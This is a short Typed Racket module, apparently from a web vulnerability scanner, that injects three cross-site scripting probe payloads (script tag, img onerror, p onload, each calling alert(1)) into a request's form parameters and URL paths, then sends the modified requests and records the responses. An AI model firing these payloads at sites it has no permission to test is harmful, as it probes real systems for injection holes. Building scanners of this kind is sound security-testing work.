#lang typed/racket

(provide attack)

(require "../http/types.rkt"
         "../http/request.rkt"
         (prefix-in payloadize: "payloadize.rkt"))

(: payloads (Listof Bytes))
(define payloads
  '(#"<script>alert(1);</script>"
    #"<img src=\"#\" onerror=\"alert(1);\" />"
    #"<p onload=\"alert(1);\"></p>"))

(: payload->path/param (-> Bytes path/param path/param))
(define (payload->path/param payload element)
  (struct-copy path/param
               element
               (path (bytes->string/utf-8 payload))))

(: payload->param (-> Bytes param param))
(define (payload->param payload element)
  (struct-copy param
               element
               (value payload)))

(: attack (-> request (Listof request-response)))
(define (attack req)
  (map
   (lambda ((req : request))
     (request-response req
                       (send req)
                       'xss))
   (append (payloadize:form-params payload->param req payloads)
           (payloadize:url-paths payload->path/param req payloads))))

